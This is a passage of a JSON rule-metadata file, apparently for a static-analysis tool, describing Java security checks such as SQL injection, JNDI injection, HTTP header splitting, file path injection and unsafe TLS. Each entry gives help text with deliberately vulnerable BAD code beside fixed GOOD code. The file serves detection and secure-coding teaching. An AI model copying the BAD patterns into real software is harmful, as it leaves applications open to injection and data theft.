SHA-256 hash.\n    MessageDigest digest = MessageDigest.getInstance(\"SHA-256\");\n    byte[] hash = digest.digest(cleartext.getBytes(StandardCharsets.UTF_8));\n    String encoded = Base64.getEncoder().encodeToString(hash);\n    return encoded;\n}\n```\n\n## References\n* Android Developers: [Work with data more securely](https://developer.android.com/topic/security/data)\n* SQLCipher: [Android Application Integration](https://www.zetetic.net/sqlcipher/sqlcipher-for-android/)\n* Common Weakness Enumeration: [CWE-312](https://cwe.mitre.org/data/definitions/312.html).\n"
  },
  "java/netty-http-request-or-response-splitting": {
    "name": "Disabled Netty HTTP header validation",
    "description": "Disabling HTTP header validation makes code vulnerable to attack by header splitting if user input is written directly to an HTTP header.",
    "kind": "problem",
    "problem.severity": "error",
    "security-severity": 6.1,
    "precision": "high",
    "id": "java/netty-http-request-or-response-splitting",
    "tags": [
      "security",
      "external/cwe/cwe-93",
      "external/cwe/cwe-113"
    ],
    "filename": "9b5a8d70-NettyResponseSplitting",
    "language": "java",
    "help": "# Disabled Netty HTTP header validation\nDirectly writing user input (for example, an HTTP request parameter) to an HTTP header can lead to an HTTP request-splitting or response-splitting vulnerability.\n\nHTTP response splitting can lead to vulnerabilities such as XSS and cache poisoning.\n\nHTTP request splitting can allow an attacker to inject an additional HTTP request into a client's outgoing socket connection. This can allow an attacker to perform an SSRF-like attack.\n\nIn the context of a servlet container, if the user input includes blank lines and the servlet container does not escape the blank lines, then a remote user can cause the response to turn into two separate responses. The remote user can then control one or more responses, which is also HTTP response splitting.\n\n\n## Recommendation\nGuard against HTTP header splitting in the same way as guarding against cross-site scripting. Before passing any data into HTTP headers, either check the data for special characters, or escape any special characters that are present.\n\nIf the code calls Netty API's directly, ensure that the `validateHeaders` parameter is set to `true`.\n\n\n## Example\nThe following example shows the 'name' parameter being written to a cookie in two different ways. The first way writes it directly to the cookie, and thus is vulnerable to response-splitting attacks. The second way first removes all special characters, thus avoiding the potential problem.\n\n\n```java\npublic class ResponseSplitting extends HttpServlet {\n\tprotected void doGet(HttpServletRequest request, HttpServletResponse response)\n\tthrows ServletException, IOException {\n\t\t// BAD: setting a cookie with an unvalidated parameter\n\t\tCookie cookie = new Cookie(\"name\", request.getParameter(\"name\"));\n\t\tresponse.addCookie(cookie);\n\n\t\t// GOOD: remove special characters before putting them in the header\n\t\tString name = removeSpecial(request.getParameter(\"name\"));\n\t\tCookie cookie2 = new Cookie(\"name\", name);\n\t\tresponse.addCookie(cookie2);\n\t}\n\n\tprivate static String removeSpecial(String str) {\n\t\treturn str.replaceAll(\"[^a-zA-Z ]\", \"\");\n\t}\n}\n\n```\n\n## Example\nThe following example shows the use of the library 'netty' with HTTP response-splitting verification configurations. The second way will verify the parameters before using them to build the HTTP response.\n\n\n```java\nimport io.netty.handler.codec.http.DefaultHttpHeaders;\n\npublic class ResponseSplitting {\n    // BAD: Disables the internal response splitting verification\n    private final DefaultHttpHeaders badHeaders = new DefaultHttpHeaders(false);\n\n    // GOOD: Verifies headers passed don't contain CRLF characters\n    private final DefaultHttpHeaders goodHeaders = new DefaultHttpHeaders();\n\n    // BAD: Disables the internal response splitting verification\n    private final DefaultHttpResponse badResponse = new DefaultHttpResponse(version, httpResponseStatus, false);\n\n    // GOOD: Verifies headers passed don't contain CRLF characters\n    private final DefaultHttpResponse goodResponse = new DefaultHttpResponse(version, httpResponseStatus);\n}\n\n```\n\n## Example\nThe following example shows the use of the netty library with configurations for verification of HTTP request splitting. The second recommended approach in the example verifies the parameters before using them to build the HTTP request.\n\n\n```java\npublic class NettyRequestSplitting {\n    // BAD: Disables the internal request splitting verification\n    private final DefaultHttpHeaders badHeaders = new DefaultHttpHeaders(false);\n\n    // GOOD: Verifies headers passed don't contain CRLF characters\n    private final DefaultHttpHeaders goodHeaders = new DefaultHttpHeaders();\n\n    // BAD: Disables the internal request splitting verification\n    private final DefaultHttpRequest badRequest = new DefaultHttpRequest(httpVersion, method, uri, false);\n\n    // GOOD: Verifies headers passed don't contain CRLF characters\n    private final DefaultHttpRequest goodResponse = new DefaultHttpRequest(httpVersion, method, uri);\n}\n\n```\n\n## References\n* SecLists.org: [HTTP response splitting](https://seclists.org/bugtraq/2005/Apr/187).\n* OWASP: [HTTP Response Splitting](https://www.owasp.org/index.php/HTTP_Response_Splitting).\n* Wikipedia: [HTTP response splitting](http://en.wikipedia.org/wiki/HTTP_response_splitting).\n* CAPEC: [CAPEC-105: HTTP Request Splitting](https://capec.mitre.org/data/definitions/105.html)\n* Common Weakness Enumeration: [CWE-93](https://cwe.mitre.org/data/definitions/93.html).\n* Common Weakness Enumeration: [CWE-113](https://cwe.mitre.org/data/definitions/113.html).\n"
  },
  "java/timing-attack-against-signature": {
    "name": "Timing attack against signature validation",
    "description": "When checking a signature over a message, a constant-time algorithm should be used. Otherwise, an attacker may be able to forge a valid signature for an arbitrary message by running a timing attack if they can send to the validation procedure both the message and the signature. A successful attack can result in authentication bypass.",
    "kind": "path-problem",
    "problem.severity": "error",
    "precision": "high",
    "id": "java/timing-attack-against-signature",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-208"
    ],
    "filename": "36269823-TimingAttackAgainstSignature",
    "language": "java",
    "help": "# Timing attack against signature validation\nA constant-time algorithm should be used for checking a MAC or a digital signature. In other words, the comparison time should not depend on the content of the input. Otherwise, an attacker may be able to forge a valid signature for an arbitrary message by running a timing attack if they can send to the validation procedure both the message and the signature. A successful attack can result in authentication bypass.\n\n\n## Recommendation\nUse `MessageDigest.isEqual()` method to check MACs and signatures. If this method is used, then the calculation time depends only on the length of input byte arrays, and does not depend on the contents of the arrays.\n\n\n## Example\nThe following example uses `Arrays.equals()` method for validating a MAC over a message. This method implements a non-constant-time algorithm. Both the message and the signature come from an untrusted HTTP request:\n\n\n```java\npublic boolean validate(HttpRequest request, SecretKey key) throws Exception {\n    byte[] message = getMessageFrom(request);\n    byte[] signature = getSignatureFrom(request);\n\n    Mac mac = Mac.getInstance(\"HmacSHA256\");\n    mac.init(new SecretKeySpec(key.getEncoded(), \"HmacSHA256\"));\n    byte[] actual = mac.doFinal(message);\n    return Arrays.equals(signature, actual);\n}\n```\nThe next example uses a safe constant-time algorithm for validating a MAC:\n\n\n```java\npublic boolean validate(HttpRequest request, SecretKey key) throws Exception {\n    byte[] message = getMessageFrom(request);\n    byte[] signature = getSignatureFrom(request);\n\n    Mac mac = Mac.getInstance(\"HmacSHA256\");\n    mac.init(new SecretKeySpec(key.getEncoded(), \"HmacSHA256\"));\n    byte[] actual = mac.doFinal(message);\n    return MessageDigest.isEqual(signature, actual);\n}\n```\n\n## References\n* Wikipedia: [Timing attack](https://en.wikipedia.org/wiki/Timing_attack).\n* Coursera: [Timing attacks on MAC verification](https://www.coursera.org/lecture/crypto/timing-attacks-on-mac-verification-FHGW1)\n* NCC Group: [Time Trial: Racing Towards Practical Remote Timing Attacks](https://www.nccgroup.trust/globalassets/our-research/us/whitepapers/TimeTrial.pdf)\n* Java API Specification: [MessageDigest.isEqual() method](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/security/MessageDigest.html#isEqual(byte[],byte[]))\n* Common Weakness Enumeration: [CWE-208](https://cwe.mitre.org/data/definitions/208.html).\n"
  },
  "java/file-path-injection": {
    "name": "File Path Injection",
    "description": "Loading files based on unvalidated user-input may cause file information disclosure and uploading files with unvalidated file types to an arbitrary directory may lead to Remote Command Execution (RCE).",
    "kind": "path-problem",
    "problem.severity": "error",
    "precision": "high",
    "id": "java/file-path-injection",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-073"
    ],
    "filename": "a3b6d758-FilePathInjection",
    "language": "java",
    "help": "# File Path Injection\nExternal Control of File Name or Path, also called File Path Injection, is a vulnerability by which a file path is created using data from outside the application (such as the HTTP request). It allows an attacker to traverse through the filesystem and access arbitrary files.\n\n\n## Recommendation\nUnsanitized user-provided data must not be used to construct file paths. In order to prevent File Path Injection, it is recommended to avoid concatenating user input directly into the file path. Instead, user input should be checked against allowed or disallowed paths (for example, the path must be within `/user_content/` or must not be within `/internal`), ensuring that neither path traversal using `../` nor URL encoding is used to evade these checks.\n\n\n## Example\nThe following examples show the bad case and the good case respectively. The `BAD` methods show an HTTP request parameter being used directly to construct a file path without validating the input, which may cause file leakage. In the `GOOD` method, the file path is validated.\n\n\n```java\n// BAD: no file download validation\nHttpServletRequest request = getRequest();\nString path = request.getParameter(\"path\");\nString filePath = \"/pages/\" + path;\nHttpServletResponse resp = getResponse();\nFile file = new File(filePath);\nresp.getOutputStream().write(file.readContent());\n\n// BAD: no file upload validation\nString savePath = getPara(\"dir\");\nFile file = getFile(\"fileParam\").getFile();\nFileInputStream fis = new FileInputStream(file);\nString filePath = \"/files/\" + savePath;\nFileOutputStream fos = new FileOutputStream(filePath);\n\n// GOOD: check for a trusted prefix, ensuring path traversal is not used to erase that prefix:\n// (alternatively use `Path.normalize` instead of checking for `..`)\nif (!filePath.contains(\"..\") && filePath.hasPrefix(\"/pages\")) { ... }\n// Also GOOD: check for a forbidden prefix, ensuring URL-encoding is not used to evade the check:\n// (alternatively use `URLDecoder.decode` before `hasPrefix`)\nif (filePath.hasPrefix(\"/files\") && !filePath.contains(\"%\")) { ... }\n```\n\n## References\n* OWASP: [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal).\n* Veracode: [External Control of File Name or Path Flaw](https://www.veracode.com/security/dotnet/cwe-73).\n* Common Weakness Enumeration: [CWE-73](https://cwe.mitre.org/data/definitions/73.html).\n"
  },
  "java/android/intent-uri-permission-manipulation": {
    "name": "Intent URI permission manipulation",
    "description": "Returning an externally provided Intent via 'setResult' may allow a malicious application to access arbitrary content providers of the vulnerable application.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.8,
    "precision": "high",
    "id": "java/android/intent-uri-permission-manipulation",
    "tags": [
      "security",
      "external/cwe/cwe-266",
      "external/cwe/cwe-926"
    ],
    "filename": "a7d9d25b-IntentUriPermissionManipulation",
    "language": "java",
    "help": "# Intent URI permission manipulation\nWhen an Android component expects a result from an Activity, `startActivityForResult` can be used. The started Activity can then use `setResult` to return the appropriate data to the calling component.\n\nIf an Activity obtains the incoming, user-provided Intent and directly returns it via `setResult` without any checks, the application may be unintentionally giving arbitrary access to its content providers, even if they are not exported, as long as they are configured with the attribute `android:grantUriPermissions=\"true\"`. This happens because the attacker adds the appropriate URI permission flags to the provided Intent, which take effect once the Intent is reflected back.\n\n\n## Recommendation\nAvoid returning user-provided or untrusted Intents via `setResult`. Use a new Intent instead.\n\nIf it is required to use the received Intent, make sure that it does not contain URI permission flags, either by checking them with `Intent.getFlags` or removing them with `Intent.removeFlags`.\n\n\n## Example\nThe following sample contains three examples. In the first example, a user-provided Intent is obtained and directly returned back with `setResult`, which is dangerous. In the second example, a new Intent is created to safely return the desired data. The third example shows how the obtained Intent can be sanitized by removing dangerous flags before using it to return data to the calling component.\n\n\n```java\npublic class IntentUriPermissionManipulation extends Activity {\n\n    // BAD: the user-provided Intent is returned as-is\n    public void dangerous() {\n        Intent intent = getIntent();\n        intent.putExtra(\"result\", \"resultData\");\n        setResult(intent);\n    }\n\n    // GOOD: a new Intent is created and returned\n    public void safe() {\n        Intent intent = new Intent();\n        intent.putExtra(\"result\", \"resultData\");\n        setResult(intent);\n    }\n\n    // GOOD: the user-provided Intent is sanitized before being returned\n    public void sanitized() {\n        Intent intent = getIntent();\n        intent.putExtra(\"result\", \"resultData\");\n        intent.removeFlags(\n                Intent.FLAG_GRANT_WRITE_URI_PERMISSION | Intent.FLAG_GRANT_READ_URI_PERMISSION);\n        setResult(intent);\n    }\n}\n\n```\n\n## References\n* Google Help: [Remediation for Intent Redirection Vulnerability](https://support.google.com/faqs/answer/9267555?hl=en).\n* Common Weakness Enumeration: [CWE-266](https://cwe.mitre.org/data/definitions/266.html).\n* Common Weakness Enumeration: [CWE-926](https://cwe.mitre.org/data/definitions/926.html).\n"
  },
  "java/cleartext-storage-in-class": {
    "name": "Cleartext storage of sensitive information using storable class",
    "description": "Storing sensitive information in cleartext can expose it to an attacker.",
    "kind": "problem",
    "problem.severity": "recommendation",
    "security-severity": 7.5,
    "precision": "medium",
    "id": "java/cleartext-storage-in-class",
    "tags": [
      "security",
      "external/cwe/cwe-499",
      "external/cwe/cwe-312"
    ],
    "filename": "c3bb55c3-CleartextStorageClass",
    "language": "java",
    "help": "# Cleartext storage of sensitive information using storable class\nSensitive information that is stored unencrypted is accessible to an attacker who gains access to the storage.\n\n\n## Recommendation\nEnsure that sensitive information is always encrypted before being stored. It may be wise to encrypt information before it is put into a heap data structure (such as `Java.util.Properties`) that may be written to disk later. Objects that are serializable or marshallable should also always contain encrypted information unless you are certain that they are not ever going to be serialized.\n\nIn general, decrypt sensitive information only at the point where it is necessary for it to be used in cleartext.\n\n\n## Example\nThe following example shows two ways of storing user credentials in a cookie. In the 'BAD' case, the credentials are simply stored in cleartext. In the 'GOOD' case, the credentials are hashed before storing them.\n\n\n```java\npublic static void main(String[] args) {\n\t{\n\t\tString data;\n\t\tPasswordAuthentication credentials =\n\t\t\t\tnew PasswordAuthentication(\"user\", \"BP@ssw0rd\".toCharArray());\n\t\tdata = credentials.getUserName() + \":\" + new String(credentials.getPassword());\n\t\n\t\t// BAD: store data in a cookie in cleartext form\n\t\tresponse.addCookie(new Cookie(\"auth\", data));\n\t}\n\t\n\t{\n\t\tString data;\n\t\tPasswordAuthentication credentials =\n\t\t\t\tnew PasswordAuthentication(\"user\", \"GP@ssw0rd\".toCharArray());\n\t\tString salt = \"ThisIsMySalt\";\n\t\tMessageDigest messageDigest = MessageDigest.getInstance(\"SHA-512\");\n\t\tmessageDigest.reset();\n\t\tString credentialsToHash =\n\t\t\t\tcredentials.getUserName() + \":\" + credentials.getPassword();\n\t\tbyte[] hashedCredsAsBytes =\n\t\t\t\tmessageDigest.digest((salt+credentialsToHash).getBytes(\"UTF-8\"));\n\t\tdata = bytesToString(hashedCredsAsBytes);\n\t\t\n\t\t// GOOD: store data in a cookie in encrypted form\n\t\tresponse.addCookie(new Cookie(\"auth\", data));\n\t}\n}\n\n```\n\n## References\n* SEI CERT Oracle Coding Standard for Java: [SER03-J. Do not serialize unencrypted, sensitive data](https://wiki.sei.cmu.edu/confluence/display/java/SER03-J.+Do+not+serialize+unencrypted+sensitive+data).\n* M. Dowd, J. McDonald and J. Schuhm, *The Art of Software Security Assessment*, 1st Edition, Chapter 2 - 'Common Vulnerabilities of Encryption', p. 43. Addison Wesley, 2006.\n* M. Howard and D. LeBlanc, *Writing Secure Code*, 2nd Edition, Chapter 9 - 'Protecting Secret Data', p. 299. Microsoft, 2002.\n* Common Weakness Enumeration: [CWE-499](https://cwe.mitre.org/data/definitions/499.html).\n* Common Weakness Enumeration: [CWE-312](https://cwe.mitre.org/data/definitions/312.html).\n"
  },
  "java/sql-injection": {
    "name": "Query built from user-controlled sources",
    "description": "Building a SQL or Java Persistence query from user-controlled sources is vulnerable to insertion of malicious code by the user.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 8.8,
    "precision": "high",
    "id": "java/sql-injection",
    "tags": [
      "security",
      "external/cwe/cwe-089",
      "external/cwe/cwe-564"
    ],
    "filename": "e6f878a0-SqlTainted",
    "language": "java",
    "help": "# Query built from user-controlled sources\nIf a database query is built using string concatenation, and the components of the concatenation include user input, a user is likely to be able to run malicious database queries. This applies to various database query languages, including SQL and the Java Persistence Query Language.\n\n\n## Recommendation\nUsually, it is better to use a SQL prepared statement than to build a complete SQL query with string concatenation. A prepared statement can include a wildcard, written as a question mark (?), for each part of the SQL query that is expected to be filled in by a different value each time it is run. When the query is later executed, a value must be supplied for each wildcard in the query.\n\nIn the Java Persistence Query Language, it is better to use queries with parameters than to build a complete query with string concatenation. A Java Persistence query can include a parameter placeholder for each part of the query that is expected to be filled in by a different value when run. A parameter placeholder may be indicated by a colon (:) followed by a parameter name, or by a question mark (?) followed by an integer position. When the query is later executed, a value must be supplied for each parameter in the query, using the `setParameter` method. Specifying the query using the `@NamedQuery` annotation introduces an additional level of safety: the query must be a constant string literal, preventing construction by string concatenation, and the only way to fill in values for parts of the query is by setting positional parameters.\n\nIt is good practice to use prepared statements (in SQL) or query parameters (in the Java Persistence Query Language) for supplying parameter values to a query, whether or not any of the parameters are directly traceable to user input. Doing so avoids any need to worry about quoting and escaping.\n\n\n## Example\nIn the following example, the code runs a simple SQL query in two different ways.\n\nThe first way involves building a query, `query1`, by concatenating an environment variable with some string literals. The environment variable can include special characters, so this code allows for SQL injection attacks.\n\nThe second way, which shows good practice, involves building a query, `query2`, with a single string literal that includes a wildcard (`?`). The wildcard is then given a value by calling `setString`. This version is immune to injection attacks, because any special characters in the environment variable are not given any special treatment.\n\n\n```java\n{\n    // BAD: the category might have SQL special characters in it\n    String category = System.getenv(\"ITEM_CATEGORY\");\n    Statement statement = connection.createStatement();\n    String query1 = \"SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='\"\n        + category + \"' ORDER BY PRICE\";\n    ResultSet results = statement.executeQuery(query1);\n}\n\n{\n    // GOOD: use a prepared query\n    String category = System.getenv(\"ITEM_CATEGORY\");\n    String query2 = \"SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY=? ORDER BY PRICE\";\n    PreparedStatement statement = connection.prepareStatement(query2);\n    statement.setString(1, category);\n    ResultSet results = statement.executeQuery();\n}\n```\n\n## Example\nThe following code shows several different ways to run a Java Persistence query.\n\nThe first example involves building a query, `query1`, by concatenating an environment variable with some string literals. Just like the SQL example, the environment variable can include special characters, so this code allows for Java Persistence query injection attacks.\n\nThe remaining examples demonstrate different methods for safely building a Java Persistence query with user-supplied values:\n\n1. `query2` uses a single string literal that includes a placeholder for a parameter, indicated by a colon (`:`) and parameter name (`category`).\n1. `query3` uses a single string literal that includes a placeholder for a parameter, indicated by a question mark (`?`) and position number (`1`).\n1. `namedQuery1` is defined using the `@NamedQuery` annotation, whose `query` attribute is a string literal that includes a placeholder for a parameter, indicated by a colon (`:`) and parameter name (`category`).\n1. `namedQuery2` is defined using the `@NamedQuery` annotation, whose `query` attribute includes a placeholder for a parameter, indicated by a question mark (`?`) and position number (`1`).\nThe parameter is then given a value by calling `setParameter`. These versions are immune to injection attacks, because any special characters in the environment variable or user-supplied value are not given any special treatment.\n\n\n```java\n{\n    // BAD: the category might have Java Persistence Query Language special characters in it\n    String category = System.getenv(\"ITEM_CATEGORY\");\n    Statement statement = connection.createStatement();\n    String query1 = \"SELECT p FROM Product p WHERE p.category LIKE '\"\n        + category + \"' ORDER BY p.price\";\n    Query q = entityManager.createQuery(query1);\n}\n\n{\n    // GOOD: use a named parameter and set its value\n    String category = System.getenv(\"ITEM_CATEGORY\");\n    String query2 = \"SELECT p FROM Product p WHERE p.category LIKE :category ORDER BY p.price\"\n    Query q = entityManager.createQuery(query2);\n    q.setParameter(\"category\", category);\n}\n\n{\n    // GOOD: use a positional parameter and set its value\n    String category = System.getenv(\"ITEM_CATEGORY\");\n    String query3 = \"SELECT p FROM Product p WHERE p.category LIKE ?1 ORDER BY p.price\"\n    Query q = entityManager.createQuery(query3);\n    q.setParameter(1, category);\n}\n\n{\n    // GOOD: use a named query with a named parameter and set its value\n    @NamedQuery(\n            name=\"lookupByCategory\",\n            query=\"SELECT p FROM Product p WHERE p.category LIKE :category ORDER BY p.price\")\n    private static class NQ {}\n    ...\n    String category = System.getenv(\"ITEM_CATEGORY\");\n    Query namedQuery1 = entityManager.createNamedQuery(\"lookupByCategory\");\n    namedQuery1.setParameter(\"category\", category);\n}\n\n{\n    // GOOD: use a named query with a positional parameter and set its value\n    @NamedQuery(\n            name=\"lookupByCategory\",\n            query=\"SELECT p FROM Product p WHERE p.category LIKE ?1 ORDER BY p.price\")\n    private static class NQ {}\n    ...\n    String category = System.getenv(\"ITEM_CATEGORY\");\n    Query namedQuery2 = entityManager.createNamedQuery(\"lookupByCategory\");\n    namedQuery2.setParameter(1, category);\n}\n```\n\n## References\n* OWASP: [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html).\n* SEI CERT Oracle Coding Standard for Java: [IDS00-J. Prevent SQL injection](https://wiki.sei.cmu.edu/confluence/display/java/IDS00-J.+Prevent+SQL+injection).\n* The Java Tutorials: [Using Prepared Statements](https://docs.oracle.com/javase/tutorial/jdbc/basics/prepared.html).\n* The Java EE Tutorial: [The Java Persistence Query Language](https://docs.oracle.com/javaee/7/tutorial/persistence-querylanguage.htm).\n* Common Weakness Enumeration: [CWE-89](https://cwe.mitre.org/data/definitions/89.html).\n* Common Weakness Enumeration: [CWE-564](https://cwe.mitre.org/data/definitions/564.html).\n"
  },
  "java/hash-without-salt": {
    "name": "Use of a hash function without a salt",
    "description": "Hashed passwords without a salt are vulnerable to dictionary attacks.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "precision": "low",
    "id": "java/hash-without-salt",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-759"
    ],
    "filename": "6626bf0a-HashWithoutSalt",
    "language": "java",
    "help": "# Use of a hash function without a salt\nIn cryptography, a salt is some random data used as an additional input to a one-way function that hashes a password or pass-phrase. It makes dictionary attacks more difficult.\n\nWithout a salt, it is much easier for attackers to pre-compute the hash value using dictionary attack techniques such as rainbow tables to crack passwords.\n\n\n## Recommendation\nUse a long random salt of at least 32 bytes then use the combination of password and salt to hash a password or password phrase.\n\n\n## Example\nThe following example shows two ways of hashing. In the 'BAD' case, no salt is provided. In the 'GOOD' case, a salt is provided.\n\n\n```java\npublic class HashWithoutSalt {\n\t// BAD - Hash without a salt.\n\tpublic void getSHA256Hash(String password) throws NoSuchAlgorithmException {\n\t\tMessageDigest md = MessageDigest.getInstance(\"SHA-256\");\n\t\tbyte[] messageDigest = md.digest(password.getBytes());\n\t}\n\n\t// GOOD - Hash with a salt.\n\tpublic void getSHA256Hash(String password, byte[] salt) throws NoSuchAlgorithmException {\n\t\tMessageDigest md = MessageDigest.getInstance(\"SHA-256\");\n\t\tmd.update(salt);\n\t\tbyte[] messageDigest = md.digest(password.getBytes());\n\t}\n}\n```\n\n## References\n* DZone: [A Look at Java Cryptography](https://dzone.com/articles/a-look-at-java-cryptography)\n* CWE: [CWE-759: Use of a One-Way Hash without a Salt](https://cwe.mitre.org/data/definitions/759.html)\n* Common Weakness Enumeration: [CWE-759](https://cwe.mitre.org/data/definitions/759.html).\n"
  },
  "java/unsafe-tls-version": {
    "name": "Unsafe TLS version",
    "description": "SSL and older TLS versions are known to be vulnerable. TLS 1.3 or at least TLS 1.2 should be used.",
    "kind": "path-problem",
    "problem.severity": "error",
    "precision": "high",
    "id": "java/unsafe-tls-version",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-327"
    ],
    "filename": "af3dd6ae-UnsafeTlsVersion",
    "language": "java",
    "help": "# Unsafe TLS version\nTransport Layer Security (TLS) provides a number of security features such as confidentiality, integrity, replay prevention and authentication. There are several versions of TLS protocols. The latest is TLS 1.3. Unfortunately, older versions were found to be vulnerable to a number of attacks.\n\n\n## Recommendation\nAn application should use TLS 1.3. Currently, TLS 1.2 is also considered acceptable.\n\n\n## Example\nThe following example shows how a socket with an unsafe TLS version may be created:\n\n\n```java\npublic SSLSocket connect(String host, int port)\n        throws NoSuchAlgorithmException, IOException {\n    \n    SSLContext context = SSLContext.getInstance(\"SSLv3\");\n    return (SSLSocket) context.getSocketFactory().createSocket(host, port);\n}\n```\nThe next example creates a socket with the latest TLS version:\n\n\n```java\npublic SSLSocket connect(String host, int port)\n        throws NoSuchAlgorithmException, IOException {\n    \n    SSLContext context = SSLContext.getInstance(\"TLSv1.3\");\n    return (SSLSocket) context.getSocketFactory().createSocket(host, port);\n}\n```\n\n## References\n* Wikipedia: [Transport Layer Security](https://en.wikipedia.org/wiki/Transport_Layer_Security)\n* OWASP: [Transport Layer Protection Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html)\n* Java SE Documentation: [Java Secure Socket Extension (JSSE) Reference Guide](https://docs.oracle.com/javase/8/docs/technotes/guides/security/jsse/JSSERefGuide.html)\n* Java API Specification: [SSLContext](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/javax/net/ssl/SSLContext.html)\n* Java API Specification: [SSLParameters](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/javax/net/ssl/SSLParameters.html)\n* Java API Specification: [SSLSocket](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/javax/net/ssl/SSLSocket.html)\n* Common Weakness Enumeration: [CWE-327](https://cwe.mitre.org/data/definitions/327.html).\n"
  },
  "java/jndi-injection": {
    "name": "JNDI lookup with user-controlled name",
    "description": "Performing a JNDI lookup with a user-controlled name can lead to the download of an untrusted object and to execution of arbitrary code.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.8,
    "precision": "high",
    "id": "java/jndi-injection",
    "tags": [
      "security",
      "external/cwe/cwe-074"
    ],
    "filename": "b150939b-JndiInjection",
    "language": "java",
    "help": "# JNDI lookup with user-controlled name\nThe Java Naming and Directory Interface (JNDI) is a Java API for a directory service that allows Java software clients to discover and look up data and resources (in the form of Java objects) via a name. If the name being used to look up the data is controlled by the user, it can point to a malicious server, which can return an arbitrary object. In the worst case, this can allow remote code execution.\n\n\n## Recommendation\nThe general recommendation is to avoid passing untrusted data to the `InitialContext.lookup ` method. If the name being used to look up the object must be provided by the user, make sure that it's not in the form of an absolute URL or that it's the URL pointing to a trusted server.\n\n\n## Example\nIn the following examples, the code accepts a name from the user, which it uses to look up an object.\n\nIn the first example, the user provided name is used to look up an object.\n\nThe second example validates the name before using it to look up an object.\n\n\n```java\nimport javax.naming.Context;\nimport javax.naming.InitialContext;\n\npublic void jndiLookup(HttpServletRequest request) throws NamingException {\n  String name = request.getParameter(\"name\");\n\n  Hashtable<String, String> env = new Hashtable<String, String>();\n  env.put(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.rmi.registry.RegistryContextFactory\");\n  env.put(Context.PROVIDER_URL, \"rmi://trusted-server:1099\");\n  InitialContext ctx = new InitialContext(env);\n\n  // BAD: User input used in lookup\n  ctx.lookup(name);\n\n  // GOOD: The name is validated before being used in lookup\n  if (isValid(name)) {\n    ctx.lookup(name);\n  } else {\n    // Reject the request\n  }\n}\n```\n\n## References\n* Oracle: [Java Naming and Directory Interface (JNDI)](https://docs.oracle.com/javase/8/docs/technotes/guides/jndi/).\n* Black Hat materials: [A Journey from JNDI/LDAP Manipulation to Remote Code Execution Dream Land](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf).\n* Veracode: [Exploiting JNDI Injections in Java](https://www.veracode.com/blog/research/exploiting-jndi-injections-java).\n* Common Weakness Enumeration: [CWE-74](https://cwe.mitre.org/data/definitions/74.html).\n"
  },
  "java/android/insecure-local-authentication": {
    "name": "Insecure local authentication",
    "description": "Local authentication that does not make use of a `CryptoObject` can be bypassed.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 4.4,
    "precision": "high",
    "id": "java/android/insecure-local-authentication",
    "tags": [
      "security",
      "external/cwe/cwe-287"
    ],
    "filename": "bcacc89f-AndroidInsecureLocalAuthentication",
    "language": "java",
    "help": "# Insecure local authentication\nBiometric local authentication such as fingerprint recognition can be used to protect sensitive data or actions within an application. However, if this authentication does not use a `KeyStore`-backed key, it can be bypassed by a privileged malicious application, or by an attacker with physical access using application hooking tools such as Frida.\n\n\n## Recommendation\nGenerate a secure key in the Android `KeyStore`. Ensure that the `onAuthenticationSuccess` callback for a biometric prompt uses it in a way that is required for the sensitive parts of the application to function, such as by using it to decrypt sensitive data or credentials.\n\n\n## Example\nIn the following (bad) case, no `CryptoObject` is required for the biometric prompt to grant access, so it can be bypassed.\n\n\n```java\nbiometricPrompt.authenticate(\n    cancellationSignal,\n    executor,\n    new BiometricPrompt.AuthenticationCallback {\n        @Override\n        // BAD: This authentication callback does not make use of a `CryptoObject` from the `result`.\n        public void onAuthenticationSucceeded(BiometricPrompt.AuthenticationResult result) {\n            grantAccess()\n        }\n    }\n)\n```\nIn the following (good) case, a secret key is generated in the Android `KeyStore`. The application requires this secret key for access, using it to decrypt data.\n\n\n```java\nprivate void generateSecretKey() {\n    KeyGenParameterSpec keyGenParameterSpec = new KeyGenParameterSpec.Builder(\n        \"MySecretKey\",\n        KeyProperties.PURPOSE_ENCRYPT | KeyProperties.PURPOSE_DECRYPT)\n        .setBlockModes(KeyProperties.BLOCK_MODE_CBC)\n        .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_PKCS7)\n        .setUserAuthenticationRequired(true)\n        .setInvalidatedByBiometricEnrollment(true)\n        .build();\n    KeyGenerator keyGenerator = KeyGenerator.getInstance(\n            KeyProperties.KEY_ALGORITHM_AES, \"AndroidKeyStore\");\n    keyGenerator.init(keyGenParameterSpec);\n    keyGenerator.generateKey();\n}\n\n\nprivate SecretKey getSecretKey() {\n    KeyStore keyStore = KeyStore.getInstance(\"AndroidKeyStore\");\n    keyStore.load(null);\n    return ((SecretKey)keyStore.getKey(\"MySecretKey\", null));\n}\n\nprivate Cipher getCipher() {\n    return Cipher.getInstance(KeyProperties.KEY_ALGORITHM_AES + \"/\"\n            + KeyProperties.BLOCK_MODE_CBC + \"/\"\n            + KeyProperties.ENCRYPTION_PADDING_PKCS7);\n}\n\npublic prompt(byte[] encryptedData) {\n    Cipher cipher = getCipher();\n    SecretKey secretKey = getSecretKey();\n    cipher.init(Cipher.DECRYPT_MODE, secretKey);\n\n    biometricPrompt.authenticate(\n        new BiometricPrompt.CryptoObject(cipher),\n        cancellationSignal,\n        